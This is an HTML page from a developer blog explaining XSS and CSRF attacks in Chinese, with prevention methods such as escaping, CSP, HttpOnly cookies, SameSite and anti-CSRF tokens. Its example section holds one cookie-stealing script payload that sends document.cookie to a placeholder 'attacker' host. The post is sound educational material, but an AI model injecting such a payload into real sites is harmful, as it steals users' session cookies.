@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前端安全 CSRF:跨站请求伪造（crooss-site request forgery） XSS：跨站脚本攻击（cross-site scripting）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端安全">
+<meta property="og:url" content="http://yoursite.com/2018/01/10/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="Giancarlo&#39;s Blog">
+<meta property="og:description" content="前端安全 CSRF:跨站请求伪造（crooss-site request forgery） XSS：跨站脚本攻击（cross-site scripting）">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2018/01/10/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/reflected-xss.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/10/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/dom-based-xss.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/10/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/encode.png">
+<meta property="article:published_time" content="2018-01-10T12:46:25.000Z">
+<meta property="article:modified_time" content="2020-06-07T02:09:33.710Z">
+<meta property="article:author" content="Guohang Ma">
+<meta property="article:tag" content="JavaScript">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2018/01/10/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/reflected-xss.png">
+
+<link rel="canonical" href="http://yoursite.com/2018/01/10/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>前端安全 | Giancarlo's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Giancarlo's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Code Life</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/10/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Guohang Ma">
+      <meta itemprop="description" content="developer blog">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Giancarlo's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          前端安全
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-01-10 20:46:25" itemprop="dateCreated datePublished" datetime="2018-01-10T20:46:25+08:00">2018-01-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-06-07 10:09:33" itemprop="dateModified" datetime="2020-06-07T10:09:33+08:00">2020-06-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JavaScript/" itemprop="url" rel="index"><span itemprop="name">JavaScript</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前端安全"><a href="#前端安全" class="headerlink" title="前端安全"></a>前端安全</h1><ul>
+<li>CSRF:跨站请求伪造（crooss-site request forgery）</li>
+<li>XSS：跨站脚本攻击（cross-site scripting）<a id="more"></a>
+
+</li>
+</ul>
+<h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><p>XSS即跨站脚本攻击，是一种脚本注入攻击，通过在被攻击者的浏览器中执行恶意JavaScript实现。</p>
+<p>考虑一下在他人浏览器上可以执行Javscript的危害性：</p>
+<ul>
+<li>JS可以访问cookie</li>
+<li>JS可以通过XMLHttpRequest对象发起ajax请求</li>
+<li>JS可以操作DOM对页面进行窜改</li>
+</ul>
+<p>通过以上描述信息，我们可以：</p>
+<ul>
+<li>盗取cookie</li>
+<li>为键盘添加监听事件，盗取密码信息</li>
+<li>伪造表单到被攻击者的浏览器，诱导提交，钓鱼攻击</li>
+</ul>
+<h3 id="示例攻击情形"><a href="#示例攻击情形" class="headerlink" title="示例攻击情形"></a>示例攻击情形</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.location=<span class="string">'http://attacker/?cookie='</span>+<span class="built_in">document</span>.cookie</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先，攻击者利用漏洞网站的表单将恶意字符串插入到网站数据库，然后被攻击者请求页面，就得到具有该恶意字符串的页面，浏览器将其作为JS解析，于是执行上述代码，将cookie信息发送到攻击者的服务器。</p>
+<h3 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h3><ul>
+<li>持久型XSS：恶意字符串来自网站数据库</li>
+<li>反射型XSS：恶意字符串来自被攻击者的请求</li>
+<li>基于DOM的XSS：漏洞位于客户端</li>
+</ul>
+<p>上面的示例为持久性XSS，下面介绍反射型XSS的基本流程。</p>
+<img src="/2018/01/10/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/reflected-xss.png" class="">
+
+<p>首先攻击者制作含有恶意字符串的链接发送给被攻击者，诱导被攻击者点击该链接，然后向服务器发起请求，服务器将含有这个而已字符串的页面返回给被攻击者，被其浏览器解析后，将被攻击者cookie发送给攻击者服务器。</p>
+<img src="/2018/01/10/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/dom-based-xss.png" class="">
+
+<p>下面是基于DOM的XSS攻击，浏览器在执行合法JS之前并不会遭受攻击。该种方法没有直接将脚本插入到页面执行，而是在执行合法JS的过程中，使用了innerHTML将恶意字符串插入到了页面上。</p>
+<h3 id="防止XSS"><a href="#防止XSS" class="headerlink" title="防止XSS"></a>防止XSS</h3><img src="/2018/01/10/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/encode.png" class="">
+
+<ul>
+<li>可以在特定上下文对输入进行转义</li>
+<li>可以对输入进行验证，设置白名单或者黑名单，但设置白名单相对容易</li>
+<li>CSP(Content security policy) ，通过设置HTTP头Content‑Security‑Policy来实现，包含一些指令，指令后面用空格分隔源表达式，来指定可用于加载的源，除了URL，还有一些关键字，列举如下，<code>none</code>表示不允许任何源，<code>self</code>允许当前服务主机源，<code>unsafe-inline</code>允许inline的style，script元素，以及<code>javascript:</code>的url,<code>unsafe-eval</code>允许使用JS的eval函数。<ul>
+<li>connect‑src</li>
+<li>font‑src</li>
+<li>frame‑src</li>
+<li>img‑src</li>
+<li>media‑src</li>
+<li>object‑src</li>
+<li>script‑src</li>
+<li>style‑src</li>
+</ul>
+</li>
+<li>HttpOnly cookie：禁止JS读取cookie</li>
+</ul>
+<h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><p>CSRF(Cross site request forgery)跨站请求伪造，利用用户已登录的身份，在用户毫不知情的情况下，执行非法操作。</p>
+<p>在GET请求的场景下，用户通过访问危险网站B，危险网站B自动发出GET请求到用户当前访问的网站A，get的地址完成一次转账操作。<br>在POST场景下，也可以通过form onload就submit的方法自动提交表单，发出POST请求。如果是在有cookie的场景下，我们一定要禁止第三方网站访问cookie，而且不要用GET提交请求，此外请求时附带验证信息如验证码，token等。</p>
+<h3 id="CSRF预防"><a href="#CSRF预防" class="headerlink" title="CSRF预防"></a>CSRF预防</h3><ul>
+<li>对cookie设置SameSite属性，该属性表明Cookie不随着跨域请求发送，但是并不是浏览器都兼容了。</li>
+<li>Referer检查，HTTP的Referer头告诉服务器请求从哪个链接过来的，服务器可以拿到这个信息进行判断。</li>
+<li>Anti CSRF Token：发送请求时在HTTP请求中加入一个随机token，服务端拿到token之后读取cookie中的token，进行比对。</li>
+<li>验证码</li>
+</ul>
+<p>2018 年 1月 10日</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/JavaScript/" rel="tag"># JavaScript</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/01/09/%E9%80%9A%E4%BF%A1%E7%9B%B8%E5%85%B3/" rel="prev" title="通信相关">
+      <i class="fa fa-chevron-left"></i> 通信相关
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/01/11/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%9C%BA%E5%88%B6/" rel="next" title="浏览器渲染机制">
+      浏览器渲染机制 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前端安全"><span class="nav-number">1.</span> <span class="nav-text">前端安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS攻击"><span class="nav-number">1.1.</span> <span class="nav-text">XSS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#示例攻击情形"><span class="nav-number">1.1.1.</span> <span class="nav-text">示例攻击情形</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS类型"><span class="nav-number">1.1.2.</span> <span class="nav-text">XSS类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防止XSS"><span class="nav-number">1.1.3.</span> <span class="nav-text">防止XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF攻击"><span class="nav-number">1.2.</span> <span class="nav-text">CSRF攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF预防"><span class="nav-number">1.2.1.</span> <span class="nav-text">CSRF预防</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Guohang Ma</p>
+  <div class="site-description" itemprop="description">developer blog</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">136</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Guohang Ma</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
